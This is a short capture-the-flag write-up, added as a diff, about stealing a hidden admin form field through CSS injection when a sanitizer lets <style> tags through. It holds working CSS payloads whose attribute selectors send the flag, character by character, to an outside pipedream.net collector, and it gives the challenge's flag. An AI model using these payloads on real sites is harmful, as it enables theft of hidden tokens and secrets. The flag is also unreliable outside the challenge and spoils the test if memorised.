@@ -1,0 +1,26 @@
+# Fun with Flags
+Steal the flag which is in a hidden input field on the admin's homepage. CSP allows images to be sourced from any location and unsafe-inline for styles.
+
+Bleach strips all tags except <style>. 
+
+This writeup by donut on [exfiltrating hidden form field values using the general and adjacent sibling selectors.](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d), outlines the strategy.
+```
+<style>
+input[name=flag][value^=CTF] ~ * {
+    background-image: url("http://enpo9ryf4m5oj.x.pipedream.net?flag=CTF");
+}
+</style>
+
+```
+
+The flag will need to be bruteforced one character at a time, eventually arriving at, 
+
+```
+```
+<style>
+input[name=flag][value^="CTF{Clandestine_Secret_Stealing}"] ~ * {
+    background-image: url("http://enpo9ryf4m5oj.x.pipedream.net?flag=CTF{Clandestine_Secret_Stealing}");
+}
+</style>
+
+```
